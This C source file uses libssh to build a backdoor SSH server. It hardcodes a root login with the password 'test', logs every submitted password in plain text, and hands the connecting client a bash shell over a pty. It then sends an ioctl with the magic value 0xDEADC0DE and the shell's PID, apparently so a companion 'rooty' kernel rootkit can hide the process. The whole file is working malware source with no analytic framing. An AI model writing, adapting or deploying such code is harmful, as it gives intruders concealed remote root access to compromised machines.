#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/callbacks.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <poll.h>
#include <pty.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#define SSHD_USER "root"
#define SSHD_PASSWORD "test"
#define KEYS_FOLDER "/etc/ssh/"
#define AUTH_TOKEN 0xDEADC0DE


struct rooty_proc_args
{
    unsigned short pid;
};

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};

static int port = 22;

static int auth_password(const char *user, const char *password)
{
    if(strcmp(user, SSHD_USER))
        return 0;
    if(strcmp(password, SSHD_PASSWORD))
        return 0;
    return 1;
}

static int authenticate(ssh_session session)
{
    ssh_message message;

    do
    {
        message=ssh_message_get(session);
        if(!message)
            break;
        switch(ssh_message_type(message))
        {
        case SSH_REQUEST_AUTH:
            switch(ssh_message_subtype(message))
            {
            case SSH_AUTH_METHOD_PASSWORD:
                printf("User %s wants to auth with pass %s\n",
                       ssh_message_auth_user(message),
                       ssh_message_auth_password(message));
                if(auth_password(ssh_message_auth_user(message),
                                 ssh_message_auth_password(message)))
                {
                    ssh_message_auth_reply_success(message,0);
                    ssh_message_free(message);
                    return 1;
                }
                ssh_message_auth_set_methods(message,
                                             SSH_AUTH_METHOD_PASSWORD |
                                             SSH_AUTH_METHOD_INTERACTIVE);

                ssh_message_reply_default(message);
                break;

            case SSH_AUTH_METHOD_NONE:
            default:
                printf("User %s wants to auth with unknown auth %d\n",
                       ssh_message_auth_user(message),
                       ssh_message_subtype(message));
                ssh_message_auth_set_methods(message,
                                             SSH_AUTH_METHOD_PASSWORD |
                                             SSH_AUTH_METHOD_INTERACTIVE);
                ssh_message_reply_default(message);
                break;
            }
            break;
        default:
            ssh_message_auth_set_methods(message,
                                         SSH_AUTH_METHOD_PASSWORD |
                                         SSH_AUTH_METHOD_INTERACTIVE);
            ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    }
    while (1);
    return 0;
}

static int copy_fd_to_chan(socket_t fd, int revents, void *userdata)
{
    ssh_channel chan = (ssh_channel)userdata;
    char buf[2048];
    int sz = 0;

    if(!chan)
    {
        close(fd);
        return -1;
    }
    if(revents & POLLIN)
    {
        sz = read(fd, buf, 2048);
        if(sz > 0)
        {
            ssh_channel_write(chan, buf, sz);
        }
    }
    if(revents & POLLHUP)
    {
        ssh_channel_close(chan);
        sz = -1;
    }
    return sz;
}

static int copy_chan_to_fd(ssh_session session,
                           ssh_channel channel,
                           void *data,
                           uint32_t len,
                           int is_stderr,
                           void *userdata)
{
    int fd = *(int*)userdata;
    int sz;
    (void)session;
    (void)channel;
    (void)is_stderr;

    sz = write(fd, data, len);
    return sz;
}

static void chan_close(ssh_session session, ssh_channel channel, void *userdata)
{
    int fd = *(int*)userdata;
    (void)session;
    (void)channel;

    close(fd);
}

struct ssh_channel_callbacks_struct cb =
{
    .channel_data_function = copy_chan_to_fd,
    .channel_eof_function = chan_close,
    .channel_close_function = chan_close,
    .userdata = NULL
};

static int main_loop(ssh_channel chan)
{
    ssh_session session = ssh_channel_get_session(chan);
    socket_t fd;
    struct termios *term = NULL;
    struct winsize *win = NULL;
    pid_t childpid;
    ssh_event event;
    short events;
    int rc;

    struct rooty_args rooty_args;
    struct rooty_proc_args rooty_proc_args;
    int sockfd;
    int io;

    childpid = forkpty(&fd, NULL, term, win);
    if(childpid == 0)
    {
        execl("/bin/bash", "/bin/bash", (char *)NULL);
        abort();
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    rooty_proc_args.pid = childpid;
    rooty_args.cmd = 1;
    rooty_args.ptr = &rooty_proc_args;

    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);

    cb.userdata = &fd;
    ssh_callbacks_init(&cb);
    ssh_set_channel_callbacks(chan, &cb);

    events = POLLIN | POLLPRI | POLLERR | POLLHUP | POLLNVAL;

    event = ssh_event_new();
    if(event == NULL)
    {
        printf("Couldn't get a event\n");
        return -1;
    }
    if(ssh_event_add_fd(event, fd, events, copy_fd_to_chan, chan) != SSH_OK)
    {
        printf("Couldn't add an fd to the event\n");
        ssh_event_free(event);
        return -1;
    }
    if(ssh_event_add_session(event, session) != SSH_OK)
    {
        printf("Couldn't add the session to the event\n");
        ssh_event_remove_fd(event, fd);
        ssh_event_free(event);
        return -1;
    }

    do
    {
        rc = ssh_event_dopoll(event, 1000);
        if (rc == SSH_ERROR)
        {
            fprintf(stderr, "Error : %s\n", ssh_get_error(session));
            ssh_event_free(event);
            ssh_disconnect(session);
            return -1;
        }
    }
    while(!ssh_channel_is_closed(chan));

    ssh_event_remove_fd(event, fd);

    ssh_event_remove_session(event, session);

    ssh_event_free(event);
    return 0;
}


int main(int argc, char **argv)
{
    ssh_session session;
    ssh_bind sshbind;
    ssh_message message;
    ssh_channel chan=0;
    int auth=0;
    int shell=0;
    int r;

    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY,
                         KEYS_FOLDER "id_dsa");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY,
                         KEYS_FOLDER "id_rsa");


    (void) argc;
    (void) argv;


    if(ssh_bind_listen(sshbind)<0)
    {
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    printf("Started sshd on port %d\n", port);
    printf("You can login as the user %s with the password %s\n", SSHD_USER,
           SSHD_PASSWORD);
    r = ssh_bind_accept(sshbind, session);
    if(r==SSH_ERROR)
    {
        printf("Error accepting a connection: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    if (ssh_handle_key_exchange(session))
    {
        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
        return 1;
    }

    auth = authenticate(session);
    if(!auth)
    {
        printf("Authentication error: %s\n", ssh_get_error(session));
        ssh_disconnect(session);
        return 1;
    }

    do
    {
        message = ssh_message_get(session);
        if(message)
        {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL_OPEN &&
                    ssh_message_subtype(message) == SSH_CHANNEL_SESSION)
            {
                chan = ssh_message_channel_request_open_reply_accept(message);
                ssh_message_free(message);
                break;
            }
            else
            {
                ssh_message_reply_default(message);
                ssh_message_free(message);
            }
        }
        else
        {
            break;
        }
    }
    while(!chan);

    if(!chan)
    {
        printf("Error: cleint did not ask for a channel session (%s)\n",
               ssh_get_error(session));
        ssh_finalize();
        return 1;
    }


    do
    {
        message = ssh_message_get(session);
        if(message != NULL)
        {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL)
            {
                if(ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_SHELL)
                {
                    shell = 1;
                    ssh_message_channel_request_reply_success(message);
                    ssh_message_free(message);
                    break;
                }
                else if(ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_PTY)
                {
                    ssh_message_channel_request_reply_success(message);
                    ssh_message_free(message);
                    continue;
                }
            }
            ssh_message_reply_default(message);
            ssh_message_free(message);
        }
        else
        {
            break;
        }
    }
    while(!shell);

    if(!shell)
    {
        printf("Error: No shell requested (%s)\n", ssh_get_error(session));
        return 1;
    }

    printf("it works !\n");

    main_loop(chan);

    ssh_disconnect(session);
    ssh_bind_free(sshbind);

    ssh_finalize();
    return 0;
}
